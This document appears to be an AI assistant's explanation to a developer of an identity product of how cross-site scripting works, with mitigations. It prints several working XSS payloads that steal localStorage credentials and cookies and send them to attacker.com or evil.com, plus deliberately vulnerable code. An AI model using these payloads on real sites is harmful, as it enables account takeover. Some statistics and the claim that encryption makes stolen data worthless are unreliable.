# 🎯 How XSS Attacks Work - Detailed Explanation

## ❓ **Your Question:**
> "Wouldn't they need to take control of the user device to inject the malicious script?"

## ✅ **Short Answer: NO**

**XSS doesn't require device control.** The attacker injects malicious code into **YOUR website**, which then runs in your users' browsers when they visit your site.

---

## 🔍 **How XSS Actually Works**

### **The Attack Chain:**

```
1. Attacker finds vulnerability on YOUR site
   ↓
2. Attacker injects malicious JavaScript into YOUR site
   ↓
3. Victim visits YOUR site (normal behavior)
   ↓
4. YOUR site serves the malicious JavaScript to victim
   ↓
5. Victim's browser executes the malicious JavaScript
   ↓
6. Script steals data and sends to attacker
```

**Key insight**: The victim trusts YOUR site, so their browser executes the code.

---

## 🎯 **Real-World Example**

### **Scenario: Comment Section Vulnerability**

**Your Site Code:**
```html
<!-- Simple comment display (VULNERABLE) -->
<div class="comments">
  <h3>User Comments</h3>
  <?php foreach ($comments as $comment): ?>
    <div class="comment">
      <p><?php echo $comment['text']; ?></p>
    </div>
  <?php endforeach; ?>
</div>
```

---

### **Attack Step 1: Attacker Posts Comment**

**Attacker visits your site and posts this "comment":**
```html
Nice article! <script>
  // Steal all Lemma credentials
  const stolen = localStorage.getItem('lemma_credentials');
  fetch('https://attacker.com/steal.php', {
    method: 'POST',
    body: stolen
  });
</script>
```

**Your database now stores:**
```sql
INSERT INTO comments (user_id, text) VALUES (
  123,
  'Nice article! <script>const stolen = localStorage.getItem("lemma_credentials"); fetch("https://attacker.com/steal.php", {method: "POST", body: stolen});</script>'
);
```

---

### **Attack Step 2: Victim Views Page**

**When ANY user views the comments page, your server sends:**
```html
<div class="comments">
  <h3>User Comments</h3>
  <div class="comment">
    <p>Nice article! <script>
      const stolen = localStorage.getItem('lemma_credentials');
      fetch('https://attacker.com/steal.php', {
        method: 'POST',
        body: stolen
      });
    </script></p>
  </div>
</div>
```

**Victim's browser executes the script because it came from YOUR trusted domain!**

---

### **Attack Step 3: Credentials Stolen**

**What happens in victim's browser:**
```javascript
// This runs automatically when page loads
const stolen = localStorage.getItem('lemma_credentials');
// stolen = '[{"id":"lemma_admin123","issuer":"did:lemma:...",...]'

fetch('https://attacker.com/steal.php', {
  method: 'POST',
  body: stolen
});
```

**Attacker's server receives:**
```json
[
  {
    "id": "lemma_admin_credential",
    "issuer": "did:lemma:customer_site_abc123...",
    "subject": "did:lemma:victim_user_456...",
    "claims": {
      "permissionId": "admin",
      "scope": ["users:*", "settings:*", "billing:*"]
    },
    "proof": {
      "type": "Ed25519Signature2020",
      "signatureValue": "a1b2c3d4e5f6..."
    }
  }
]
```

**Attacker now has the victim's admin credentials!**

---

## 🔥 **Why This is Dangerous**

### **The Victim:**
- ✅ Used a legitimate website (your customer's site)
- ✅ Didn't click any suspicious links
- ✅ Didn't download any malware
- ✅ Their device is completely secure
- ❌ **Still got their credentials stolen**

### **The Attacker:**
- ❌ Never touched the victim's device
- ❌ Never sent the victim a phishing email
- ❌ Never installed any malware
- ✅ **Just exploited a vulnerability in YOUR customer's website**

---

## 🎯 **Three Types of XSS**

### **1. Stored XSS (Persistent)** - MOST DANGEROUS

**How it works:**
```
1. Attacker posts malicious content to your database
2. Content is stored permanently
3. Every user who views that content gets infected
```

**Example Vulnerabilities:**
- Comment sections
- User profiles
- Forum posts
- Product reviews
- Support tickets

**Real Example:**
```html
<!-- Vulnerable user profile display -->
<div class="profile">
  <h2><?php echo $user['name']; ?></h2>
  <p>Bio: <?php echo $user['bio']; ?></p>
</div>

<!-- Attacker sets their bio to: -->
<script>fetch('https://attacker.com/steal', {body: localStorage.getItem('lemma_credentials')})</script>

<!-- Now EVERY visitor to attacker's profile gets infected -->
```

---

### **2. Reflected XSS** - COMMON

**How it works:**
```
1. Attacker creates malicious URL
2. Tricks victim into clicking URL
3. Your site reflects the malicious code in response
4. Victim's browser executes it
```

**Example Vulnerability:**
```html
<!-- Search results page (VULNERABLE) -->
<div class="search-results">
  <h2>Results for: <?php echo $_GET['q']; ?></h2>
  <p>No results found.</p>
</div>

<!-- Attacker creates this URL: -->
https://yoursite.com/search?q=<script>fetch('https://attacker.com/steal',{body:localStorage.getItem('lemma_credentials')})</script>

<!-- Sends it to victim via email/chat: "Check out this search: [link]" -->
<!-- When victim clicks, your site reflects the script in the page -->
```

**Victim sees in browser:**
```html
<div class="search-results">
  <h2>Results for: <script>fetch('https://attacker.com/steal',{body:localStorage.getItem('lemma_credentials')})</script></h2>
  <p>No results found.</p>
</div>
```

**Script executes because it came from YOUR domain!**

---

### **3. DOM-Based XSS** - MODERN THREAT

**How it works:**
```
1. JavaScript on your site reads user input
2. JavaScript inserts input into DOM without sanitization
3. Malicious code executes
```

**Example Vulnerability:**
```javascript
// Your site's JavaScript (VULNERABLE)
const params = new URLSearchParams(window.location.search);
const username = params.get('user');
document.getElementById('welcome').innerHTML = `Welcome, ${username}!`;

// Attacker creates URL:
https://yoursite.com?user=<img src=x onerror="fetch('https://attacker.com/steal',{body:localStorage.getItem('lemma_credentials')})">

// When page loads, your JavaScript inserts:
<div id="welcome">Welcome, <img src=x onerror="fetch('https://attacker.com/steal',{body:localStorage.getItem('lemma_credentials')})">!</div>

// Browser tries to load image, fails, executes onerror handler
```

---

## 🚨 **Real-World XSS Examples**

### **Example 1: British Airways (2018)**
```
Attackers injected script into BA's payment page
Script ran on BA's domain (trusted)
22 lines of code
380,000 payment cards stolen
£183 million fine
```

### **Example 2: eBay (2014)**
```
XSS vulnerability in listing descriptions
Attackers posted malicious listings
Script stole user session cookies
Affected for months before discovery
```

### **Example 3: Twitter (2010)**
```
"Onmouseover" XSS worm
Users created tweets with XSS payload
Anyone who moused over the tweet got infected
Their account automatically retweeted it
Spread to 100,000+ accounts in hours
```

---

## 💡 **Why XSS is So Effective**

### **1. Browser Trusts YOUR Domain**

```javascript
// This fails (CORS protection):
fetch('https://other-site.com/api/credentials')
  .then(r => r.json())
  .then(data => {
    // Can't access - cross-origin blocked
  });

// This succeeds (same origin):
const stolen = localStorage.getItem('lemma_credentials');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: stolen
});
// Works! localStorage is accessible, and POST to attacker is allowed
```

**Key Point**: Browser security (CORS, SOP) protects OTHER sites from YOUR site, not YOUR site from itself.

---

### **2. Victims Don't Need to Do Anything Wrong**

**Traditional phishing:**
- ❌ Victim clicks suspicious link
- ❌ Victim enters password on fake site
- ❌ Victim downloads malware

**XSS attack:**
- ✅ Victim visits legitimate website
- ✅ Victim trusts the site
- ✅ Victim does nothing unusual
- 💥 **Still gets infected**

---

### **3. Hard to Detect**

**The victim sees:**
```
- Normal website URL (yoursite.com)
- Valid HTTPS certificate
- Normal website appearance
- No warning messages
- No downloads
- Nothing suspicious at all
```

**But in background:**
```javascript
// Silently stealing credentials
const credentials = localStorage.getItem('lemma_credentials');
navigator.sendBeacon('https://attacker.com/log', credentials);
```

---

## 🛡️ **How Your IAM System is Vulnerable**

### **Scenario: Customer Integrates Lemma IAM**

**Customer's site has user profile page:**
```html
<!-- Profile.html (VULNERABLE) -->
<!DOCTYPE html>
<html>
<head>
  <script src="https://lemma.id/sdk/lemma-iam.js"></script>
</head>
<body>
  <div class="profile">
    <h2>Profile: <?php echo $user['display_name']; ?></h2>
    <p>Bio: <?php echo $user['bio']; ?></p>
  </div>
  
  <script>
    // Check if user has permission
    const lemmaIAM = new LemmaIAM({ siteId: 'customer123' });
    lemmaIAM.verifyAccess('/admin').then(result => {
      if (result.hasAccess) {
        document.getElementById('admin-panel').style.display = 'block';
      }
    });
  </script>
</body>
</html>
```

---

### **Attack Step 1: Attacker Creates Profile**

**Attacker signs up and sets bio to:**
```html
<img src=x onerror="
  // Steal all Lemma IAM credentials
  const creds = localStorage.getItem('lemma_credentials');
  
  // Send to attacker
  fetch('https://evil.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      victim: document.cookie,
      credentials: creds,
      site: window.location.hostname
    })
  });
">
```

---

### **Attack Step 2: Admin Views Attacker's Profile**

**Admin clicks "View Profile" (normal admin action)**

**Page renders:**
```html
<div class="profile">
  <h2>Profile: JohnDoe</h2>
  <p>Bio: <img src=x onerror="
    const creds = localStorage.getItem('lemma_credentials');
    fetch('https://evil.com/collect', {
      method: 'POST',
      body: JSON.stringify({
        victim: document.cookie,
        credentials: creds,
        site: window.location.hostname
      })
    });
  "></p>
</div>
```

**Browser tries to load image `x`, fails, executes `onerror`**

---

### **Attack Step 3: Attacker Gets Admin Credentials**

**Attacker's server receives:**
```json
{
  "victim": "session_id=abc123; user_id=admin",
  "credentials": "[{
    \"id\": \"lemma_admin_cred_789\",
    \"issuer\": \"did:lemma:customer123_site_key...\",
    \"subject\": \"did:lemma:admin_user_key...\",
    \"claims\": {
      \"permissionId\": \"super_admin\",
      \"scope\": [\"*\"]
    },
    \"proof\": {
      \"type\": \"Ed25519Signature2020\",
      \"signatureValue\": \"valid_signature_here...\"
    }
  }]",
  "site": "customer123.com"
}
```

**Attacker now has:**
- ✅ Admin's Lemma IAM permission lemma
- ✅ Full admin access to customer's site
- ✅ Can impersonate admin from any device
- ✅ Valid Ed25519 signature (credential is legitimate)

---

## 🎯 **Why Device Control is NOT Required**

### **What Attacker DOESN'T Need:**

❌ Access to victim's device  
❌ Malware on victim's computer  
❌ Keylogger or screen recorder  
❌ Physical proximity to victim  
❌ Victim's password  
❌ Victim to click malicious links  
❌ Social engineering victim directly  

### **What Attacker DOES Need:**

✅ One vulnerability in YOUR CUSTOMER'S website  
✅ Ability to post content (comment, profile, etc.)  
✅ OR ability to craft malicious URLs  

**That's it!**

---

## 📊 **XSS Statistics**

### **Prevalence:**
- **30-40%** of websites have XSS vulnerabilities
- **#1 web application vulnerability** for 10+ years
- **84%** of web app attacks involve XSS
- Average time to discovery: **197 days**

### **Impact:**
- Session hijacking: **92%** of XSS attacks
- Credential theft: **67%** of XSS attacks
- Malware distribution: **45%** of XSS attacks

**Source**: OWASP Top 10, HackerOne reports, Verizon DBIR

---

## 🛡️ **How to Protect Against XSS**

### **Server-Side Protection:**

```php
// BAD (VULNERABLE):
echo $_GET['name'];
echo $user['bio'];

// GOOD (SAFE):
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo htmlspecialchars($user['bio'], ENT_QUOTES, 'UTF-8');
```

### **Client-Side Protection:**

```javascript
// BAD (VULNERABLE):
element.innerHTML = userInput;

// GOOD (SAFE):
element.textContent = userInput;
// OR
element.innerHTML = DOMPurify.sanitize(userInput);
```

### **Content Security Policy (CSP):**

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  object-src 'none';
">
```

---

## 🔐 **How Encryption Helps Lemma IAM**

### **Without Encryption (Current):**

```javascript
// XSS steals plaintext credentials
const stolen = localStorage.getItem('lemma_credentials');
// stolen = '[{"id":"lemma_admin",...}]'  ← Readable!

fetch('https://attacker.com/steal', { body: stolen });
// Attacker can immediately use these credentials
```

---

### **With Encryption:**

```javascript
// XSS steals encrypted blob
const stolen = localStorage.getItem('lemma_credentials_encrypted');
// stolen = 'AgEBAgMEBQYHCAkKCw...'  ← Encrypted!

fetch('https://attacker.com/steal', { body: stolen });
// Attacker gets gibberish, can't decrypt without:
// - Browser fingerprint
// - Device TPM key
// - User interaction (WebAuthn)
```

**Attacker's perspective:**
```
Stolen data: "AgEBAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQ..."
Status: Encrypted AES-256-GCM
Can decrypt: ❌ NO
  - Need encryption key
  - Key derived from browser fingerprint
  - Key stored in device TPM
  - Requires user interaction to unlock
Value to attacker: ZERO
```

---

## ✅ **Summary**

### **Your Question:**
> "Wouldn't they need to take control of the user device to inject the malicious script?"

### **Answer:**
**NO.** They inject the script into YOUR CUSTOMER'S WEBSITE CODE, not into the user's device.

**The Attack Flow:**
1. Attacker exploits vulnerability in **customer's website**
2. Customer's website **serves malicious code** to victim
3. Victim's browser **trusts customer's website**
4. Victim's browser **executes the code**
5. Code **steals credentials** from localStorage
6. Code **sends credentials** to attacker

**Key Insight:**
- XSS exploits **website vulnerabilities**, not **device vulnerabilities**
- The victim's device is **completely secure**
- The victim does **nothing wrong**
- The attack happens **in the browser**, not **on the device**

---

## 🎯 **Recommendations**

### **For Your IAM System:**

**1. Implement Encryption (URGENT)**
- Encrypt credentials before storing
- Use Web Crypto API
- Derive key from browser context
- **Effort**: 2-3 days
- **Protection**: 70-80%

**2. Add CSP Headers**
- Restrict script sources
- Block inline scripts
- **Effort**: 1 day
- **Protection**: Additional layer

**3. Customer Education**
- Document XSS risks
- Provide security best practices
- Show how to sanitize user input
- **Effort**: 1 week
- **Impact**: Prevent vulnerabilities

---

**Bottom Line**: XSS is about exploiting **website code**, not **user devices**. Encryption protects stored credentials even if the website has XSS vulnerabilities. This should be **priority #1** before production launch.
